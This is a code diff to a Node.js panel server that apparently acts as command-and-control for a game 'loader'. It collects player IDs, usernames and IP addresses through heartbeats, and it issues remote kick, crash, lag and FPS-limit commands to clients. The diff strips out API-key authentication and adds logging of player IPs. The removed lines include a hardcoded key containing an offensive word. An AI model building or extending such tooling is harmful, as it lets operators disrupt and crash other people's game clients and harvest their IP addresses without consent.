@@ -12,18 +12,6 @@ const players = new Map();
 const pastPlayers = new Map();
 const commandStates = new Map();
 
-// API Key for authentication
-const API_KEY = 'aggredireontopstupidnga';
-
-// Middleware to verify API key
-function verifyApiKey(req, res, next) {
-    const key = req.headers['x-api-key'] || req.query.api_key;
-    if (key !== API_KEY) {
-        return res.status(401).json({ error: 'Invalid API key' });
-    }
-    next();
-}
-
 // Cleanup offline players every 10 seconds
 setInterval(() => {
     const now = Date.now();
@@ -32,6 +20,7 @@ setInterval(() => {
             player.online = false;
             pastPlayers.set(userId, player);
             players.delete(userId);
+            console.log(`[CLEANUP] Player ${userId} moved to past players`);
         }
     }
 }, 10000);
@@ -39,7 +28,10 @@ setInterval(() => {
 // POST /api/public/heartbeat - Receive player data from loader
 app.post('/api/public/heartbeat', (req, res) => {
     const data = req.body;
+    console.log(`[HEARTBEAT] Received from user_id: ${data?.user_id}`);
+
     if (!data || !data.user_id) {
+        console.log('[HEARTBEAT] REJECTED: Missing user_id');
         return res.status(400).json({ error: 'Missing user_id' });
     }
 
@@ -65,24 +57,24 @@ app.post('/api/public/heartbeat', (req, res) => {
         commandStates.set(data.user_id, { fps_limit: false, lag_n: false, lag_c: false, kick: false, crash: false });
     }
 
-    console.log(`[HEARTBEAT] ${data.user_id} - ${data.username} - ${data.game_name} - Brainrots: ${(data.brainrots || []).length}`);
+    console.log(`[HEARTBEAT] OK - ${data.user_id} | ${data.username} | Game: ${data.game_name} | Brainrots: ${(data.brainrots || []).length} | IP: ${data.ip_address || 'none'}`);
     res.json({ success: true, message: 'Heartbeat received' });
 });
 
 // GET /api/public/command - Send commands to loader
 app.get('/api/public/command', (req, res) => {
     const userId = req.query.user_id;
+    console.log(`[COMMAND POLL] Request from user_id: ${userId}`);
+
     if (!userId) {
+        console.log('[COMMAND POLL] REJECTED: Missing user_id');
         return res.status(400).json({ error: 'Missing user_id' });
     }
 
     const state = commandStates.get(userId) || { fps_limit: false, lag_n: false, lag_c: false, kick: false, crash: false };
     const cmd = { ...state };
 
-    // Log commands being sent
-    if (cmd.kick || cmd.crash || cmd.fps_limit || cmd.lag_n || cmd.lag_c) {
-        console.log(`[COMMAND -> ${userId}] kick=${cmd.kick}, crash=${cmd.crash}, fps=${cmd.fps_limit}, lag_n=${cmd.lag_n}, lag_c=${cmd.lag_c}`);
-    }
+    console.log(`[COMMAND POLL] Sending to ${userId}:`, JSON.stringify(cmd));
 
     // Clear one-shot commands after sending
     const s = commandStates.get(userId);
@@ -97,24 +89,26 @@ app.get('/api/public/command', (req, res) => {
 // POST /api/command - Panel sends commands to player
 app.post('/api/command', (req, res) => {
     const { user_id, fps_limit, lag_n, lag_c, kick, crash } = req.body;
+    console.log(`[COMMAND RECEIVED] From panel for user_id: ${user_id}`, req.body);
 
     if (!user_id) {
+        console.log('[COMMAND RECEIVED] REJECTED: Missing user_id');
         return res.status(400).json({ error: 'Missing user_id' });
     }
 
     const state = commandStates.get(user_id);
     if (!state) {
+        console.log(`[COMMAND RECEIVED] REJECTED: Player ${user_id} not found`);
         return res.status(404).json({ error: 'Player not found' });
     }
 
     if (fps_limit !== undefined) state.fps_limit = fps_limit;
     if (lag_n !== undefined) state.lag_n = lag_n;
     if (lag_c !== undefined) state.lag_c = lag_c;
-    if (kick) state.kick = true;
-    if (crash) state.crash = true;
+    if (kick === true) state.kick = true;
+    if (crash === true) state.crash = true;
 
-    console.log(`[COMMAND <- ${user_id}] fps=${state.fps_limit}, lag_n=${state.lag_n}, lag_c=${state.lag_c}, kick=${state.kick}, crash=${state.crash}`);
-
+    console.log(`[COMMAND RECEIVED] OK - Updated state for ${user_id}:`, JSON.stringify(state));
     res.json({ success: true, current_state: state });
 });
 
@@ -124,6 +118,7 @@ app.get('/api/players', (req, res) => {
         ...Array.from(players.values()),
         ...Array.from(pastPlayers.values()).filter(p => !players.has(p.user_id))
     ];
+    console.log(`[PLAYERS LIST] Sending ${allPlayers.length} players`);
     res.json({ players: allPlayers });
 });
 
@@ -147,6 +142,5 @@ app.get('/', (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`Panel server running on port ${PORT}`);
-    console.log(`API Key: ${API_KEY}`);
+    console.log(`[SERVER STARTED] Panel server running on port ${PORT}`);
 });
